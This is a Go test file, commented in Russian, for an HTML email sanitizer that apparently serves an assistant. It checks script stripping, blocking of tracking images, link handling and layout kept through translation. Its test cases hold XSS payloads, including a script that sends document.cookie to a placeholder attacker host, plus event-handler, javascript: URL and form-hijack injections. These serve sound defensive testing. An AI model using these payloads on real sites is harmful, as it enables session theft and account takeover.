package htmlsafe

import "strings"

import "testing"

// Приметы из настоящих писем. Каждая строка — попытка выполниться в
// адресе Сёмы; ни одна не должна дожить до разметки.
func TestDangerousNeverPasses(t *testing.T) {
	cases := []struct {
		name, letter, banned string
	}{
		{"скрипт", `<p>привет</p><script>fetch('//зло/'+document.cookie)</script>`, "script"},
		{"обработчик", `<img src="data:image/gif;base64,R0lGOD" onerror="alert(1)">`, "onerror"},
		{"обработчик у ссылки", `<a href="https://ok" onclick="alert(1)">жми</a>`, "onclick"},
		{"javascript в ссылке", `<a href="javascript:alert(1)">жми</a>`, "javascript:"},
		{"javascript с пробелом", `<a href="java&#9;script:alert(1)">жми</a>`, "script:alert"},
		{"svg с onload", `<svg onload="alert(1)"><circle r="9"/></svg>`, "onload"},
		{"base уводит ссылки", `<base href="https://зло/"><a href="/x">жми</a>`, "<base"},
		{"iframe", `<iframe src="https://зло/"></iframe>`, "iframe"},
		{"object", `<object data="зло.swf"></object>`, "object"},
		{"форма с полем", `<form action="https://зло/"><input name="пароль"></form>`, "<form"},
		{"мета-переход", `<meta http-equiv="refresh" content="0;url=https://зло/">`, "meta"},
		{"внешний стиль", `<link rel="stylesheet" href="https://зло/a.css">`, "<link"},
		{"импорт в стилях", `<style>@import url(https://зло/a.css);</style>`, "@import"},
		{"expression в стиле", `<div style="width:expression(alert(1))">а</div>`, "expression"},
		{"условный комментарий", `<!--[if IE]><script>alert(1)</script><![endif]-->`, "script"},
		{"srcdoc", `<iframe srcdoc="<script>alert(1)</script>"></iframe>`, "srcdoc"},
		{"формдействие", `<button formaction="https://зло/">жми</button>`, "formaction"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := Clean(c.letter, false).HTML
			if strings.Contains(strings.ToLower(got), c.banned) {
				t.Errorf("в очищенном осталось %q:\n%s", c.banned, got)
			}
		})
	}
}

// Внешняя картинка — это отметка о прочтении: рассылка узнаёт, что адрес
// живой. Без кнопки человека она не грузится, но считается.
func TestImagesNotLoadedWithoutAsking(t *testing.T) {
	letter := `<p>Счёт</p><img src="https://track/пиксель.gif?кому=ivan" width="1" height="1">` +
		`<img src="http://ещё/логотип.png" alt="Логотип"><img src="data:image/gif;base64,R0lGOD" alt="своя">`
	r := Clean(letter, false)
	if strings.Contains(r.HTML, "track") || strings.Contains(r.HTML, "ещё/логотип") {
		t.Errorf("внешняя картинка просочилась:\n%s", r.HTML)
	}
	if r.Images != 2 {
		t.Errorf("внешних картинок насчитано %d, а их 2", r.Images)
	}
	if !strings.Contains(r.HTML, "data:image/gif") {
		t.Error("своя картинка из письма (data:) должна остаться")
	}
	// человек нажал «Показать картинки» — тогда грузим
	r = Clean(letter, true)
	if !strings.Contains(r.HTML, "track") {
		t.Error("по кнопке человека внешние картинки должны грузиться")
	}
}

// Письмо в базе уже помечено разбором почты: сетевой `src` переименован в
// `data-blocked-src`, чтобы браузер за картинкой не пошёл. Мы обязаны это
// понимать — иначе кнопка «Показать картинки» ничего не показывает.
func TestMarkedImagesReturnOnButton(t *testing.T) {
	letter := `<img data-blocked-src="https://track/пиксель.gif" width="1">` +
		`<div style="background:url(x-blocked-https://зло/фон.png)">а</div>` +
		`<style>.ш{background:url(x-blocked-https://зло/шапка.png)}</style>`
	r := Clean(letter, false)
	if strings.Contains(r.HTML, "https://track") {
		t.Errorf("помеченная картинка загрузилась бы:\n%s", r.HTML)
	}
	if r.Images != 1 {
		t.Errorf("помеченных картинок насчитано %d, а она 1", r.Images)
	}
	if strings.Contains(r.HTML, "url(https://зло") {
		t.Errorf("фон из CSS загрузился бы:\n%s", r.HTML)
	}
	r = Clean(letter, true)
	if !strings.Contains(r.HTML, `src="https://track/пиксель.gif"`) {
		t.Errorf("по кнопке картинка должна вернуться на место:\n%s", r.HTML)
	}
	if !strings.Contains(r.HTML, "url(https://зло/шапка.png)") {
		t.Errorf("по кнопке фон из CSS должен вернуться:\n%s", r.HTML)
	}
}

// Относительная ссылка увела бы к самой Сёме: человек кликает в письме, а
// попадает к своему же ассистенту, думая, что ушёл к отправителю.
func TestRelativeLinkNeverPasses(t *testing.T) {
	r := Clean(`<a href="/settings:secrets">важное</a><a href="https://ok.ru/a">внешняя</a>`, false)
	if strings.Contains(r.HTML, "settings:secrets") {
		t.Errorf("относительная ссылка осталась:\n%s", r.HTML)
	}
	if !strings.Contains(r.HTML, "https://ok.ru/a") {
		t.Errorf("внешняя ссылка пропала:\n%s", r.HTML)
	}
	if !strings.Contains(r.HTML, `rel="noopener noreferrer nofollow"`) {
		t.Errorf("ссылка без rel: отправитель узнает, откуда пришли:\n%s", r.HTML)
	}
	if !strings.Contains(r.HTML, "важное") {
		t.Error("текст ссылки должен остаться, даже когда адрес выброшен")
	}
}

// Письмо остаётся письмом: таблицы, стили и текст рассылки должны
// доехать, иначе от «как в письме» нет толку.
func TestLetterStaysLetter(t *testing.T) {
	letter := `<html><head><title>Счёт</title></head><body>
<style>.итог{font-weight:bold;color:#c00}</style>
<table cellpadding="4" bgcolor="#f7f7f7"><tr><td align="right" colspan="2">
<span class="итог" style="font-size:18px">К оплате: 512,30 ₽</span></td></tr></table>
<p>Здравствуйте, <b>Вадим</b>!<br>Срок — <i>12 сентября</i>.</p></body></html>`
	r := Clean(letter, false)
	for _, want := range []string{"<table", "cellpadding", "bgcolor", "colspan", "К оплате: 512,30 ₽",
		"font-weight:bold", `class="итог"`, "font-size:18px", "<b>Вадим</b>", "<i>12 сентября</i>"} {
		if !strings.Contains(r.HTML, want) {
			t.Errorf("из письма пропало %q:\n%s", want, r.HTML)
		}
	}
	// заголовок документа письма — не заголовок нашей страницы
	if strings.Contains(r.HTML, "<title") {
		t.Error("<title> письма остался")
	}
}

// Кривая разметка — норма для почты: незакрытые теги и мусор не должны
// ни ронять разбор, ни выносить текст письма.
func TestBrokenMarkupKeepsText(t *testing.T) {
	r := Clean(`<div><p>первая<div>вторая<blink>третья</blink><unknown>четвёртая`, false)
	for _, word := range []string{"первая", "вторая", "третья", "четвёртая"} {
		if !strings.Contains(r.HTML, word) {
			t.Errorf("текст %q потерян:\n%s", word, r.HTML)
		}
	}
}

// Перевод меняет слова, а не письмо: вёрстка, таблицы, картинки и порядок
// остаются теми же.
func TestTranslationKeepsLayout(t *testing.T) {
	letter := `<table bgcolor="#f7f7f7"><tr><td align="right">` +
		`<b>Total due</b> 512.30 &euro;</td></tr></table>` +
		`<p>Dear customer, <i>pay by Friday</i>.</p>` +
		`<img data-blocked-src="https://шапка.png" alt="logo">` +
		`<style>.a{color:#c00}</style>`

	lines := Lines(letter)
	// «512.30 €» и содержимое <style> переводить нечего
	for _, s := range lines {
		if s == ".a{color:#c00}" {
			t.Error("в перевод попал CSS")
		}
	}
	want := []string{"Total due", "Dear customer,", "pay by Friday", "."}
	if len(lines) < 3 {
		t.Fatalf("строк для перевода %d: %v", len(lines), lines)
	}
	if lines[0] != want[0] {
		t.Errorf("первая строка %q", lines[0])
	}

	translations := make([]string, len(lines))
	for i, s := range lines {
		switch s {
		case "Total due":
			translations[i] = "К оплате"
		case "Dear customer,":
			translations[i] = "Уважаемый покупатель,"
		case "pay by Friday":
			translations[i] = "оплатите до пятницы"
		default:
			translations[i] = s
		}
	}
	r := Translate(letter, translations, false)

	// слова заменились
	for _, want := range []string{"К оплате", "Уважаемый покупатель", "оплатите до пятницы"} {
		if !strings.Contains(r.HTML, want) {
			t.Errorf("перевод не встал на место: нет %q\n%s", want, r.HTML)
		}
	}
	// а письмо осталось письмом
	for _, want := range []string{"<table", `bgcolor="#f7f7f7"`, `align="right"`, "<b>", "<i>", "512.30"} {
		if !strings.Contains(r.HTML, want) {
			t.Errorf("вёрстка изменилась: нет %q\n%s", want, r.HTML)
		}
	}
	// картинка так и не загружена без спроса
	if r.Images != 1 {
		t.Errorf("картинок насчитано %d", r.Images)
	}
	if strings.Contains(r.HTML, "шапка.png") {
		t.Error("картинка загрузилась бы без спроса")
	}
}

// Перевод пришёл не для всех строк — на месте остаётся подлинник.
// Половина письма на чужом языке лучше, чем половина, съехавшая на чужое
// место.
func TestPartialTranslationDoesNotShiftTexts(t *testing.T) {
	letter := `<p>First</p><p>Second</p><p>Third</p>`
	r := Translate(letter, []string{"Первый"}, false)
	if !strings.Contains(r.HTML, "Первый") {
		t.Errorf("первый перевод не встал: %s", r.HTML)
	}
	if !strings.Contains(r.HTML, "Second") || !strings.Contains(r.HTML, "Third") {
		t.Errorf("непереведённое пропало или съехало: %s", r.HTML)
	}
	// и наоборот: лишние переводы не ломают письмо
	r2 := Translate(letter, []string{"Первый", "Второй", "Третий", "Лишний"}, false)
	if strings.Contains(r2.HTML, "Лишний") {
		t.Errorf("лишний перевод попал в письмо: %s", r2.HTML)
	}
}
